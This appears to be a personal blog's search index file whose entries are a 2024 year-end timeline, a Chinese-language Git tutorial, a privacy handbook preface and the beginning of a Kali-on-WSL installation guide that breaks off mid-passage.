<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2024年终总结</title>
      <link href="/posts/43e60ea4b856/"/>
      <url>/posts/43e60ea4b856/</url>
      
        <content type="html"><![CDATA[<div class="timeline green"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2024 春</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>01-17</p></div></div><div class='timeline-item-content'><p>人生第一次拿到了某一门大学课程的终绩第一名</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>04-21~04-27</p></div></div><div class='timeline-item-content'><p>人生第一次作为出题人和评委协办CTF比赛</p></div></div></div><div class="timeline orange"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2024 夏</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>06-01</p></div></div><div class='timeline-item-content'><p>21🎂🎂🎂</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>08-11~08-14</p></div></div><div class='timeline-item-content'><p>飞往西北工业大学太仓校区，参加第十七届全国大学生信息安全竞赛作品赛，获得一等奖</p></div></div></div><div class="timeline purple"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2024 秋</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>09-04~09-07</p></div></div><div class='timeline-item-content'><p>参加第二届熵密杯，在GZTime的陪伴下爽吃</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>09-10~09-11</p></div></div><div class='timeline-item-content'><p>参加羊城杯，顺便逛国家网络安全宣传周展览</p></div></div></div><div class="timeline blue"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2024 冬</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>11-12</p></div></div><div class='timeline-item-content'><p>中大百年校庆</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>12-04</p></div></div><div class='timeline-item-content'><p>收到华为offer，秋招之旅收官</p></div></div></div>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Git原理与用法系统总结</title>
      <link href="/posts/401b31cb03e1/"/>
      <url>/posts/401b31cb03e1/</url>
      
        <content type="html"><![CDATA[<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://liaoxuefeng.com/books/git/introduction/">简介 - Git教程 - 廖雪峰的官方网站 (liaoxuefeng.com)</a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>为什么突然对Git这么感兴趣？可能是因为在一次面试中，被问到了一个我答不上来的Git相关问题，那一刻我觉得，这<strong>技术债</strong>得还一还了。</p><p>用了这么久的GitHub和Gitee，我才意识到我对Git的理解还只是停留在表层。每天的<code>push</code>和<code>pull</code>，似乎成了例行公事，却很少深入思考它们背后的原理。</p><p>为什么要这么深入地研究Git？真相是，不论你是在日常开发中还是在技术面试中，一旦展示出对Git原理和操作的娴熟掌握，总能让你鹤立鸡群。想想看，当别人还在用图形界面点来点去时，你已经在终端里飞速敲出命令，这不仅仅是效率的提升，更是一种<strong>极客精神的体现</strong>。</p><p>而学习Git的过程，确实也让我发现，这不仅仅是一项技术，更像是一门<strong>艺术</strong>🎨，什么样的天才能够设计出这么巧妙的工具？原来是<strong>Linus</strong>啊，那没事了😇</p><h1 id="版本控制系统"><a href="#版本控制系统" class="headerlink" title="版本控制系统"></a>版本控制系统</h1><div class="note info flat"><p><strong>版本控制</strong>是一种记录一个或若干文件内容变化，以便将来<strong>查阅特定版本修订情况</strong>的系统。 有了它你就可以将选定的文件回溯到之前的状态，甚至<strong>将整个项目都回退到过去某个时间点的状态</strong>，你可以比较文件的变化细节，查出最后是谁修改了哪个地方，从而找出导致怪异问题出现的原因，又是谁在何时报告了某个功能缺陷等等。</p></div><p>版本控制系统发展可以分为三个阶段：</p><ul><li>本地版本控制系统</li><li>集中式版本控制系统</li><li>分布式版本控制系统</li></ul><p><strong>Git属于分布式版本控制系统</strong>，客户端并不只提取最新版本的文件快照， 而是把代码仓库完整地镜像下来，包括完整的历史记录。 这么一来，任何一处协同工作用的服务器发生故障，事后都可以用任何一个镜像出来的本地仓库恢复。 因为每一次的克隆操作，实际上都是一次对代码仓库的完整备份。</p><img src="/posts/401b31cb03e1/4bf4eebc654c4bd490d39c04ef06dfae.png" class="" title="4bf4eebc654c4bd490d39c04ef06dfae"><h1 id="Git的诞生"><a href="#Git的诞生" class="headerlink" title="Git的诞生"></a>Git的诞生</h1><p>到 2002 年，Linux 系统已经发展了十年了，代码库之大让 Linus 很难继续通过手工方式管理了，整个项目组开始启用一个专有的分布式版本控制系统<span class="bubble-content">BitKeeper </span><span class="bubble-notation"><span class="bubble-item" style="background-color:#565fc3;"> BitKeeper是一个分布式版本控制系统，最初由Larry McVoy在1990年代末设计并开发。这个系统为软件开发项目提供了版本控制和源代码管理功能。BitKeeper最初是为了满足更高的性能需求和改进并发管理而开发的，这在当时的其他版本控制系统中往往缺乏有效支持。 </span></span>来管理和维护代码，BitKeeper 的东家 BitMover 公司也免费授权 Linux 社区使用这个版本控制系统。后来 BitMover 公司发现社区有人试图破解 BitKeeper 的协议，于是 BitMover 公司收了回 Linux 社区的免费使用权。</p><p>所以Linus 花了<strong>两周时间</strong>自己用 C 写了一个分布式版本控制系统，也就是 Git。</p><p>不由得佩服人家的灵感和效率🫢</p><h1 id="配置Git"><a href="#配置Git" class="headerlink" title="配置Git"></a>配置Git</h1><h2 id="配置用户名和邮件"><a href="#配置用户名和邮件" class="headerlink" title="配置用户名和邮件"></a>配置用户名和邮件</h2><p>安装完 Git 之后，要做的第一件事就是设置你的用户名和邮件地址。 这一点很重要，因为每一个 Git 提交都会使用这些信息，它们会写入到你的每一次提交中，不可更改：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global user.name <span class="string">&quot;R1ck&quot;</span></span><br><span class="line">$ git config --global user.email xxx@gmail.com</span><br></pre></td></tr></table></figure><h2 id="配置颜色"><a href="#配置颜色" class="headerlink" title="配置颜色"></a>配置颜色</h2><p>下面的命令让 Git 显示颜色，会让命令输出看起来更醒目：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global color.ui <span class="literal">true</span></span><br></pre></td></tr></table></figure><h2 id="配置-gitignore文件"><a href="#配置-gitignore文件" class="headerlink" title="配置.gitignore文件"></a>配置<code>.gitignore</code>文件</h2><p>有些时候，你必须把某些文件放到 Git 工作目录中，但又不能提交它们，比如保存了数据库密码的配置文件等等，就可以使用忽略特殊文件 <code>.gitignore</code> 来很方便的解决这个问题。</p><p>各种现成的种配置文件: <a href="https://github.com/github/gitignore">https://github.com/github/gitignore</a></p><p>下面是一些例子</p><p>假设你在 Windows 下进行 Python 开发，Windows 会自动在有图片的目录下生成隐藏的缩略图文件，如果有自定义目录，目录下就会有Desktop.ini文件，因此你需要忽略 Windows 自动生成的垃圾文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Windows:</span><br><span class="line">Thumbs.db</span><br><span class="line">ehthumbs.db</span><br><span class="line">Desktop.ini</span><br></pre></td></tr></table></figure><p>Python编译产生的<code>.pyc、.pyo、dist</code>等文件或目录也可以被忽略掉</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># Python:</span><br><span class="line">*.py[cod]</span><br><span class="line">*.so</span><br><span class="line">*.egg</span><br><span class="line">*.egg-info</span><br><span class="line">dist</span><br><span class="line">build</span><br></pre></td></tr></table></figure><p>当然我们也可以编写例外规则，例如避免<code>.*</code>这个规则把<code>.gitignore</code>也排除了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 排除所有.开头的隐藏文件:</span><br><span class="line">.*</span><br><span class="line"># 排除所有.class文件:</span><br><span class="line">*.class</span><br><span class="line"></span><br><span class="line"># 不排除.gitignore和App.class:</span><br><span class="line">!.gitignore</span><br><span class="line">!App.class</span><br></pre></td></tr></table></figure><h1 id="Git的基础用法"><a href="#Git的基础用法" class="headerlink" title="Git的基础用法"></a>Git的基础用法</h1><h2 id="初始化仓库"><a href="#初始化仓库" class="headerlink" title="初始化仓库"></a>初始化仓库</h2><p>通过<code>git init</code>命令可以把目录变成 Git 可以管理的仓库：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git init</span><br></pre></td></tr></table></figure><br>同时在当前目录下多了一个<code>.git</code>的目录，这个目录是 Git 来跟踪管理版本库的</p><h2 id="克隆现有的仓库"><a href="#克隆现有的仓库" class="headerlink" title="克隆现有的仓库"></a>克隆现有的仓库</h2><p>当你执行 git clone 命令的时候，默认配置下远程 Git 仓库中的每一个文件的每一个版本都将被拉取下来。</p><p>克隆仓库的命令是 <code>git clone &lt;url&gt;</code></p><p>如果你想在克隆远程仓库的时候，自定义本地仓库的名字，可以通过额外的参数指定新的目录名：</p><p>例如下面这条命令，把目标目录名变成了<code>mydocs</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/xxx/xxx mydocs</span><br></pre></td></tr></table></figure><h2 id="添加暂存文件"><a href="#添加暂存文件" class="headerlink" title="添加暂存文件"></a>添加暂存文件</h2><p>用命令git add可以告诉 Git，把指定文件添加到<strong>暂存区域</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git add readme.txt</span><br></pre></td></tr></table></figure><p>我们可以通过<code>git add .</code>将当前目录下的所有文件添加到暂存区域</p><h2 id="提交变动到仓库"><a href="#提交变动到仓库" class="headerlink" title="提交变动到仓库"></a>提交变动到仓库</h2><p>用命令git commit告诉 Git，把文件提交到仓库：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git commit -m <span class="string">&quot;wrote a readme file&quot;</span></span><br></pre></td></tr></table></figure><br>-m后面输入的是本次提交的说明，<strong>最好是有意义的</strong></p><p>我们可以通过git add命令分多次暂存不同的文件，然后通过git commit一次性整合提交到仓库</p><p>在git commit之前，git add并不会向仓库中添加对象</p><p><strong>git commit只会提交所有暂存区中的文件</strong></p><h2 id="比较变动"><a href="#比较变动" class="headerlink" title="比较变动"></a>比较变动</h2><p><code>git status</code>命令可以让我们时刻掌握仓库当前的状态，显示仓库中距离上一次提交后被修改过的文件</p><p>而使用<code>git diff 文件名</code>则可以查看该文件中的具体修改</p><p>一般来说我们在add完所有文件后，可以通过<code>git status</code>来确保仓库的状态、查看是否有修改错的文件</p><h2 id="查看日志"><a href="#查看日志" class="headerlink" title="查看日志"></a>查看日志</h2><p><code>git log</code>会显示出每一个commit版本、作者以及说明<br>而<code>git log --pretty=oneline</code>则会显示得更简洁和整齐，只包含commit版本和说明</p><h2 id="Git回退"><a href="#Git回退" class="headerlink" title="Git回退"></a>Git回退</h2><p>在 Git 中，用<code>HEAD</code>表示当前版本，也就是最新的提交<br>上一个版本就是HEAD^，上上一个版本就是HEAD^^<br>往上n个版本可以写作<code>HEAD~n</code></p><p>当我们希望将版本回退到上一个版本，则可以使用<code>git reset</code>命令：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git reset --hard HEAD^</span><br></pre></td></tr></table></figure></p><h2 id="Git重置"><a href="#Git重置" class="headerlink" title="Git重置"></a>Git重置</h2><p><code>git reflog</code>用来记录我们的每一次命令<br>当我们不希望再回退到上一个版本时，可以通过git reflog命令找到回退之前的的commit id，并使用<code>git reset --hard 具体的id</code>来恢复</p><img src="/posts/401b31cb03e1/ea3fe59fd05e4b0387517ac9a2cb1b8b.png" class="" title="ea3fe59fd05e4b0387517ac9a2cb1b8b"><h2 id="暂存区"><a href="#暂存区" class="headerlink" title="暂存区"></a>暂存区</h2><img src="/posts/401b31cb03e1/01ff25445cc3486fbc17d11d105cf213.png" class="" title="#left 01ff25445cc3486fbc17d11d105cf213"><p>工作区有一个隐藏目录<code>.git</code>，其中存放了暂存区<code>stage</code>，以及版本库</p><p>git add命令实际上就是把要提交的所有修改放到暂存区（Stage），然后，执行git commit就可以一次性把暂存区的所有修改提交到分支。</p><h1 id="Git版本管理"><a href="#Git版本管理" class="headerlink" title="Git版本管理"></a>Git版本管理</h1><h2 id="重新提交"><a href="#重新提交" class="headerlink" title="重新提交"></a>重新提交</h2><p>如果你在最后一次提交后意识到忘记添加了某些更改，<code>git commit --amend</code> 允许你修正这个错误。这个命令会重新提交暂存区中的文件，更新上一次的提交。</p><p><strong>新的提交将代替之前提交的内容</strong></p><p><strong>旧有的提交在<code>git log</code>分支提交历史中会被删除</strong>，不过仍然可以在 <code>git reflog</code> 中找到，方便撤销</p><h2 id="取消暂存"><a href="#取消暂存" class="headerlink" title="取消暂存"></a>取消暂存</h2><p><code>git reset HEAD &lt;file&gt;</code>可以用于取消暂存，<strong>将上一次通过add提交到暂存区的该文件撤销</strong>，这对你想进行独立的commit提交非常有用</p><h2 id="撤销对文件的修改"><a href="#撤销对文件的修改" class="headerlink" title="撤销对文件的修改"></a>撤销对文件的修改</h2><p><code>git checkout -- &lt;file&gt;</code>会将对文件在本地的任何修改都消除掉，即使该文件的修改还没有提交到暂存区</p><img src="/posts/401b31cb03e1/c6c2129da3af40358b61fc9da8806320.png" class="" title="#left c6c2129da3af40358b61fc9da8806320"><p>我们可以理解为该操作是将版本库中的对应文件覆盖到本地</p><p>所以该命令也<strong>可以被用于恢复本地被错删的文件</strong></p><h1 id="Git分支"><a href="#Git分支" class="headerlink" title="Git分支"></a>Git分支</h1><h2 id="Git分支的优势"><a href="#Git分支的优势" class="headerlink" title="Git分支的优势"></a>Git分支的优势</h2><p>分支用于将工作从开发主线上分离开来，以免影响开发主线。在很多版本控制系统中，这是一个略微低效的过程——常常需要完全创建一个源代码目录的副本。</p><p><strong>Git 处理分支的方式可谓是难以置信的轻量，创建新分支这一操作几乎能在瞬间完成</strong>，并且在不同分支之间的切换操作也是一样便捷。 与许多其它版本控制系统不同，Git <strong>鼓励在工作流程中频繁地使用分支与合并</strong>，哪怕一天之内进行许多次。</p><h2 id="Git的数据结构"><a href="#Git的数据结构" class="headerlink" title="Git的数据结构"></a>Git的数据结构</h2><p>Git在处理分支时之所以能做到轻量，与保存数据的方式有关。</p><p>在进行<code>add</code>暂存操作时，会为每一个文件计算校验和。然后会把当前版本的文件快照会<strong>以<code>blob</code>对象的形式</strong>保存到 Git 仓库中，而校验和则加入到暂存区域等待提交。</p><p>在进行<code>commit</code>提交操作时，Git会为每一个子目录生成<strong>树对象</strong>，该对象负责记录目录结构，并保存着指向各文件快照<br>（blob对象）的索引。</p><img src="/posts/401b31cb03e1/5235437839a04e30a0568f274bdde96e.png" class="" title="#left 5235437839a04e30a0568f274bdde96e"><p>接下来生成一个<strong>提交对象（commit object）</strong>，并保存<strong>指向根目录树对象的指针</strong>，当然，该提交对象还包含了作者的姓名和邮箱、提交时输入的信息以及指向它的父对象的指针。</p><img src="/posts/401b31cb03e1/1199443e545c41db8a355fdb1a8aaa2e.png" class="" title="#left 1199443e545c41db8a355fdb1a8aaa2e"><p>这个父对象，指的就是上一次提交时产生的提交对象。下面这张图会比较直观，每一次提交产生的提交对象串成了一个链表，或者说一条时间线。</p><img src="/posts/401b31cb03e1/0655bffc14844760adb04ff1b15398e0.png" class="" title="#left 0655bffc14844760adb04ff1b15398e0"><h2 id="分支本质"><a href="#分支本质" class="headerlink" title="分支本质"></a>分支本质</h2><p>Git 的分支，其实本质上仅仅是<strong>指向提交对象的可变指针</strong>。</p><p>Git 的默认分支名字是 <code>master</code>，<code>master</code>分支会在每次提交时自动向前移动。</p><p>一开始的时候，<code>master</code>分支是一条线，Git 用<code>master</code>指向最新的提交，再用<code>HEAD</code>指向<code>master</code>，就能确定当前分支，以及当前分支的提交点</p><p>当我们创建新的分支，例如v1.0时，Git 新建了一个指针叫v1.0，指向master相同的提交，再把HEAD指向v1.0，就表示当前分支在v1.0上</p><img src="/posts/401b31cb03e1/fc217782c77b48f1a80ecbddea115ed0.png" class="" title="#left fc217782c77b48f1a80ecbddea115ed0"><p>此时我们也可以看出，<strong>Git在创建分支时</strong>并不需要拷贝原本分支的文件，<strong>仅仅是添加了一个指针</strong>，工作区的文件没有任何变化</p><p>删除分支时，我们也只需要将指针给删掉就行</p><p>如果我们不考虑复杂的合并冲突问题，当两个分支在一条时间线上时，合并这两个分支要做的仅仅是将分支指针沿时间线移动</p><h2 id="基础指令"><a href="#基础指令" class="headerlink" title="基础指令"></a>基础指令</h2><p>我的git中的默认分支从master改为了main，所以后文中的默认分支均用main指代</p><p>我们可以使用<code>git branch 分支名</code>来创建分支<br>并使用<code>git checkout 分支名</code>来切换到指定分支</p><p>或者在checkout命令后使用<code>-b</code>参数，同时执行创建和切换</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout -b dev</span><br></pre></td></tr></table></figure><img src="/posts/401b31cb03e1/63e2318c88194444b0ce192c190cf3cf.png" class="" title="#left 63e2318c88194444b0ce192c190cf3cf"><p>使用<code>git branch</code>我们还能查看一共存在哪些分支，以及当前处在哪个分支，当前分支前面会标一个*号</p><p>我们在dev分支上进行文件修改后，如果想将dev上的修改合并到main分支，可以先切回main分支，并使用<code>git merge</code>指令<br><code>git merge</code>指令用于合并指定分支到当前分支</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git checkout main</span><br><span class="line">git merge dev</span><br></pre></td></tr></table></figure><img src="/posts/401b31cb03e1/c5113ca043fb4b66b7a564ec9606fcdb.png" class="" title="#left c5113ca043fb4b66b7a564ec9606fcdb"><p>合并完后如果不再需要dev分支，在<code>git branch</code>后加上<code>-d</code>参数即可删除指定分支</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -d dev</span><br></pre></td></tr></table></figure><img src="/posts/401b31cb03e1/c290565f02de4c8180f282708720f455.png" class="" title="#left c290565f02de4c8180f282708720f455"><p>当然，如果我们容易将<code>git checkout 分支名</code>（切换分支）和<code>git checkout -- &lt;file&gt;</code>（撤销修改）弄混，也可以用<code>git switch</code>来切换分支</p><p><code>git switch</code>也可以通过<code>-c</code>参数来同时完成创建和切换的操作</p><img src="/posts/401b31cb03e1/8845876c7bc24f93bc9df377563379ba.png" class="" title="#left 8845876c7bc24f93bc9df377563379ba"><h2 id="保留分支历史"><a href="#保留分支历史" class="headerlink" title="保留分支历史"></a>保留分支历史</h2><p>当我们直接用Fast forward模式合并分支后，如果删除分支，则会丢掉分支信息</p><p>我们可以通过<code>--no-ff</code>参数，<strong>在合并时生成一个新的commit</strong></p><p>这样相当于被合并的分支的指针会留在该分支的最后一个commit，而Head则会执行新的commit</p><p>此时当我们使用<code>git log --graph</code>展示分支和合并历史时，就能直观地看到时间线上有一个合并的点</p><img src="/posts/401b31cb03e1/72a93e9a7073498b8dee06233a1db4c6.png" class="" title="#left 72a93e9a7073498b8dee06233a1db4c6"><h2 id="分支的应用策略"><a href="#分支的应用策略" class="headerlink" title="分支的应用策略"></a>分支的应用策略</h2><h3 id="开发策略"><a href="#开发策略" class="headerlink" title="开发策略"></a>开发策略</h3><p>再日常开发中，分支管理的基本原则如下：</p><ul><li><p>master分支应该是非常稳定的，也就是仅用来发布新版本，平时不能在上面干活；</p></li><li><p>开发和更新代码都在dev分支上进行，也就是说，dev分支是不稳定的，到某个时候，比如1.0版本发布时，再把dev分支合并到master上，并在master分支发布1.0版本；</p></li><li><p>团队成员每个人都可以从dev分支上创建属于自己的分支，并将自己的修改合并到dev分支上。</p></li></ul><img src="/posts/401b31cb03e1/7fc05d374f2940e4b2d4bafcdbcfd60a.png" class="" title="#left 7fc05d374f2940e4b2d4bafcdbcfd60a"><h3 id="bug分支"><a href="#bug分支" class="headerlink" title="bug分支"></a>bug分支</h3><p>当我们需要修复bug时，也可以开一个临时的分支，修复完在合并并删除临时分支</p><p>当然如果手头分支的开发还没做完，我们可以使用<code>git stash</code><strong>将当前的工作进度存起来</strong></p><p>等我们在主分支修完bug，可以再回到自己的分支</p><p>使用<code>git stash apply</code>可以<strong>将工作区恢复到之前保存的工作进度</strong>，当然<code>stash</code>里的内容还需要使用<code>git stash drop</code>来删除；或者使用<code>git stash pop</code>，恢复的同时把stash内容也删了</p><p>而如果我们想将主分支修复的bug补丁复制到当前分支（通常自己的分支也存在同样的bug），那么可以使用<code>git cherry-pick bug分支名</code>，<strong>将修bug所做的补丁复制到当前分支</strong>，而不需要merge整个主分支</p><p>当然我们也可以在自己的分支修完bug再将改动复制到主分支</p><h3 id="feature分支"><a href="#feature分支" class="headerlink" title="feature分支"></a>feature分支</h3><p>添加新功能时，也可以新建一个feature分支</p><p>如果这个功能分支开发到一半，不想要了，可以使用<code>git branch -D</code><strong>强制删除分支</strong>，而不需要像<code>-d</code>参数只能在合并后删除分支</p><h2 id="解决冲突"><a href="#解决冲突" class="headerlink" title="解决冲突"></a>解决冲突</h2><img src="/posts/401b31cb03e1/407b85afa6d54ab2af44b6dc1c59e7e9.png" class="" title="#left 407b85afa6d54ab2af44b6dc1c59e7e9"><p>在工作中，经常会出现团队成员与自己<strong>修改了dev分支的同一处文件</strong>，并且改动不一致。</p><img src="/posts/401b31cb03e1/6b0f252afad34f62a5779eda62eb851d.png" class="" title="#left 6b0f252afad34f62a5779eda62eb851d"><p>而且如果此时团队成员开发更快，已经提前合并到dev分支上，那么自己再进行合并时就会出现冲突</p><img src="/posts/401b31cb03e1/81a586efaaec4434befbdc1ef6c2f055.png" class="" title="#left 81a586efaaec4434befbdc1ef6c2f055"><p>此时我们需要手动解决冲突后才能提交<br>使用<code>git status</code>查看出现冲突的文件</p><img src="/posts/401b31cb03e1/5dbd3f1e04134c939dc1a5bdd797fc35.png" class="" title="#left 5dbd3f1e04134c939dc1a5bdd797fc35"><p>查看具体冲突文件，会发现git已经自动将冲突位置标出，以及冲突分支间的差异</p><img src="/posts/401b31cb03e1/fb6434f7ef7a44d4b2b47b0cb9fe1964.png" class="" title="#left fb6434f7ef7a44d4b2b47b0cb9fe1964"><p>修改完冲突即可使用commit提交并合并</p><img src="/posts/401b31cb03e1/e2b37b487bfe461389dd52154847efc9.png" class="" title="#left e2b37b487bfe461389dd52154847efc9"><p>当我们使用<code>git cherry-pick</code>命令复制提交时，也可能出现代码冲突</p><p>当我们解决完冲突，可以使用<code>--continue</code>参数让Cherry pick 过程继续执行<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git cherry-pick --<span class="built_in">continue</span></span><br></pre></td></tr></table></figure></p><h1 id="Git多人协作"><a href="#Git多人协作" class="headerlink" title="Git多人协作"></a>Git多人协作</h1><h2 id="远程仓库"><a href="#远程仓库" class="headerlink" title="远程仓库"></a>远程仓库</h2><p>我们使用到最多的Git远程仓库即github，它不仅仅是开源社区，也通过远程仓库功能连接起不同团队成员的本地Git，让团队协作变得方便</p><p>一般来说远程仓库的默认名称是<code>origin</code></p><p>使用<code>git remote -v</code>可以查看自己绑定的远程仓库的详细信息</p><h2 id="推送分支"><a href="#推送分支" class="headerlink" title="推送分支"></a>推送分支</h2><p>推送分支使用<code>git push</code>指令，先指定远程分支，然后是被merged的本地分支</p><p>例如<code>git push origin master</code></p><h2 id="抓取分支"><a href="#抓取分支" class="headerlink" title="抓取分支"></a>抓取分支</h2><p>当我们进行推送时，如果发现远程仓库已经有最新提交，且存在冲突，则需要<strong>先用<code>git pull</code>把最新的提交抓取下来，在本地合并</strong></p><p>在本地解决完冲突，再使用<code>git push origin &lt;branch-name&gt;</code>推送<br>即可成功</p><h2 id="git-rebase变基"><a href="#git-rebase变基" class="headerlink" title="git rebase变基"></a>git rebase变基</h2><p><code>git base</code>能通过挪动提交的位置，使得分叉的提交历史整理成一条直线</p><h1 id="Git标签"><a href="#Git标签" class="headerlink" title="Git标签"></a>Git标签</h1><h2 id="标签的意义"><a href="#标签的意义" class="headerlink" title="标签的意义"></a>标签的意义</h2><p>发布一个版本时，通常先在版本库中打一个标签（tag）</p><p>标签与分支类似，就是指向某个commit的指针</p><p>而标签的引入则是给某个commit设置一个有意义的别名，方便人们根据版本快速查询commit</p><h2 id="创建标签"><a href="#创建标签" class="headerlink" title="创建标签"></a>创建标签</h2><p>首先切换到要打标签的分支上</p><p>使用<code>git tag &lt;name&gt;</code>就可以打一个新标签，默认该标签是打在最新提交的<code>commit</code>上的</p><p>当然一个可以在最后指定commit id，将标签打在指定commit上<br>例如<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git tag v0.9 fb8b190</span><br></pre></td></tr></table></figure><br>用命令<code>git tag</code>可以查看所有标签</p><h2 id="删除标签"><a href="#删除标签" class="headerlink" title="删除标签"></a>删除标签</h2><p>使用<code>-d</code>参数可以删除指定标签</p><p><code>git tag -d &lt;name&gt;</code></p><h2 id="推送标签到远程"><a href="#推送标签到远程" class="headerlink" title="推送标签到远程"></a>推送标签到远程</h2><p>要将特定的标签推送到远程仓库，使用命令 <code>git push origin &lt;tagname&gt;</code>。如果你想一次性推送所有本地标签，可以使用 <code>git push origin --tags</code>。</p>]]></content>
      
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>个人隐私保护手册</title>
      <link href="/posts/10a98f25092d/"/>
      <url>/posts/10a98f25092d/</url>
      
        <content type="html"><![CDATA[<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://evilcos.me/yinsi.html">https://evilcos.me/yinsi.html</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这几天在欣赏某位黑客前辈的博客</p><p>偶然翻到他在2014年撰写的科普文章</p><p>我觉得时至今日，里面的许多保护手段依然是有效和必要的</p><p>所以这篇文章我希望筛选其中重要的观点，并结合最新的网络环境，做一份个人隐私保护手册</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>WSL kali安装及无缝模式部署</title>
      <link href="/posts/c12b1506032a/"/>
      <url>/posts/c12b1506032a/</url>
      
        <content type="html"><![CDATA[<h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://blog.csdn.net/qq_54704239/article/details/140264070">windows 11 + kali wsl二合一配置步骤与踩坑_kex无缝模式使用指导-CSDN博客</a></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>以往使用kali系统都是通过VMware虚拟机</p><p>最近偶然了解到<strong>wsl+无缝模式</strong>这种<strong>丝滑感拉满</strong>的方式</p><h1 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h1><img src="/posts/c12b1506032a/image-20240728214620945.png" class="" title="image-20240728214620945"><h1 id="部署wsl-kali"><a href="#部署wsl-kali" class="headerlink" title="部署wsl kali"></a>部署wsl kali</h1><h2 id="下载-wsl-kali"><a href="#下载-wsl-kali" class="headerlink" title="下载 wsl kali"></a>下载 wsl kali</h2><p>目前下载wsl版本的kali系统，最万无一失的方法即在微软商店下载</p><p>链接如下：<a href="https://apps.microsoft.com/detail/9pkr34tncv07?hl=en-us&amp;gl=US">Kali Linux - Free download and install on Windows | Microsoft Store</a></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20240728160456025.png" alt="image-20240728160456025"></p><p>或者直接在本地微软商店搜索<code>kali linux</code></p><img src="/posts/c12b1506032a/image-20240728162115376.png" class="" title="image-20240728162115376"><h2 id="移动至非系统盘"><a href="#移动至非系统盘" class="headerlink" title="移动至非系统盘"></a>移动至非系统盘</h2><p>默认情况下，从微软商店下载的kali系统会放置在系统盘</p><p>但是后续为了体验完整的kali工具，我们至少要<strong>留出40GB以上的空间</strong></p><p>为了维持windows系统的流畅程度，很显然不适合将wsl kali存储在系统盘中</p><p>首先执行如下指令查看wsl中kali系统的名称</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl -l -v</span><br></pre></td></tr></table></figure><img src="/posts/c12b1506032a/image-20240728163511413.png" class="" title="image-20240728163511413"><p>执行<code>wsl --shutdown</code>关闭wsl服务</p><img src="/posts/c12b1506032a/image-20240728163700115.png" class="" title="image-20240728163700115"><p>导出kali镜像到指定位置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --export kali-linux &lt;path_to_tar&gt;</span><br></pre></td></tr></table></figure><img src="/posts/c12b1506032a/image-20240728164034042.png" class="" title="image-20240728164034042"><p>从wsl注销系统盘上的kali系统</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span 